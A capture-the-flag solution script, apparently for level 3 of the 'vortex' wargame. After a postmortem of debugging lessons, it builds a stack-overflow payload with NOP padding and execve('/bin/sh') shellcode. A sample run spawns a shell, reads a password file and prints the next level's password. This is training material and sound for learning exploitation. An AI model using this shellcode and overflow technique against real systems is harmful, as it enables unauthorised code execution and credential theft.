#!/usr/bin/env python
import struct
__docs__ = '''
0x00 - find out where things are on the stack
0x01 - find out where the checks are and how to evade
        - follow the confusing pointers...
0x02 - find out how to execute shellcode
'''

postmortem = '''

# Good

    - stepping through the entire source until you understand all machine instructions
    was helpful. I didn't understand what mov eax,gs:0x14 was doing and I ended up
    learning a lot about the security model of the intel arch, memory segmentation and paging

    - learned a bit about the different segments in memory (plt), how to read them with objdump
    and the connection between objdump output and /proc/pid/maps

    - was able to get past the bitmask conditional pretty much instantly. I read that statement
    and knew exactly what I had to do

    - flag get :)

# Bad

    - ALWAYS ensure the target system and your system match EXACTLY
    I spent a lot of time stepping through with gdb on my system
    only to find out after much frustration, that the behavior was different
    on the remote machine because I recompiled with -ggdb3 for debug help

# Improvements

    - remember everything is just numbers in memory, the **ptr trick was right there if I was paying
    attention. what number is at this address? can that help me?

    - get better at objdump output. part of the reason the **ptr trick wasn't visible to me
    was I was not used to objdump and reading it CAREFULLY.

    - attempt local analysis in a way that matches remote exactly, so you don't waste time
'''

def p(x):
    return struct.pack('<L', x)

payload = ''
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload += '\x90' * (128 - len(shellcode))
payload += shellcode
# lpp check is the next N bytes, we have to guess.
# in gdb it's 4
payload += p(0x08048312) * 10

print payload

'''
vortex3@melinda:~$ /vortex/vortex3 $(python /tmp/poc3.py)
$ whoami
vortex4
$ cat /etc/vortex_pass/vortex4
2YmgK1=jw
'''


